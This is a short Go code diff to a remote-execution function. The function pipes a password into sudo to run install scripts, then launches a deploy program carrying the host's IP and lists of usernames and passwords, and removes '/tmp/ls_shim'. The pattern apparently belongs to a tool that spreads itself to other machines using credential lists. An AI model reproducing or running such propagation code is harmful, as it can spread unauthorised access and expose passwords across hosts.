@@ -70,10 +70,10 @@ func runRemote(username, password, ip string) {
 		"echo " + password + " | sudo -S ./deploy/dependencies.sh\n" +
 		"echo " + password + " | sudo -S chmod +x install.sh\n" +
 		"echo " + password + " | sudo -S ./install.sh\n"
-	if isTarget {
+	if true {
 		command += "cd deploy\n" +
 			"echo " + password + " | sudo -S go run deploy.go -i " + GetOutboundIP() + " -m --user-list " + strings.Join(usernames, ",") + " --password-list" + strings.Join(passwords, ",") + "\n"
-		fmt.Printf(command)
+		fmt.Println(command)
 		os.Exit(0)
 	}
 	command += "echo " + password + " | sudo -S rm -rf /tmp/ls_shim\n"
